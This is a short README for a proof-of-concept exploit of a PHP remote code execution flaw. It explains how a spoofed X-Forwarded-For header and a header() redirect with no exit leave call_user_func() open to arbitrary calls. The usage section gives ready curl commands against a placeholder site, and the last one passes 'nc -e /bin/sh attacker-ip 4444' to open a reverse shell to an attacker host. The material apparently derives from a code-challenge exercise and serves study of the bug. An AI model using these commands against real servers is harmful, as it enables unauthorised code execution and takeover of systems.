# PHP Remote Code Execution (RCE) PoC
This repository contains a proof-of-concept (PoC) exploit for a vulnerability that allows IP spoofing and Remote Code Execution (RCE) in PHP applications. The vulnerability arises due to improper use of the $_SERVER['HTTP_X_FORWARDED_FOR'] header for IP validation and the use of the call_user_func() function, which allows arbitrary code execution.

# Vulnerability Details
- The application attempts to validate the client’s IP address using the $_SERVER['HTTP_X_FORWARDED_FOR'] header.
- However, an attacker can spoof the IP address by manipulating the X-Forwarded-For header to 127.0.0.1, bypassing the IP validation check.
- If the attacker does not have a valid session ($_SESSION['auth']), the application redirects to error.php.
- However, the header() function does not stop code execution, meaning the code continues running even after the redirect.
- This results in the execution of call_user_func($_GET['cmd'], $_GET['arg']);, allowing an attacker to execute arbitrary PHP functions and potentially compromise the server.

# Exploit Usage
```sh
curl -H "X-Forwarded-For: 127.0.0.1" "http://vulnerable-site.com/vuln.php"
```
```sh
curl -H "X-Forwarded-For: 127.0.0.1" "http://vulnerable-site.com/vuln.php?cmd=system&arg=id"
```
```sh
curl -H "X-Forwarded-For: 127.0.0.1" "http://vulnerable-site.com/vuln.php?cmd=system&arg=nc -e /bin/sh attacker-ip 4444"
```


## References
https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/
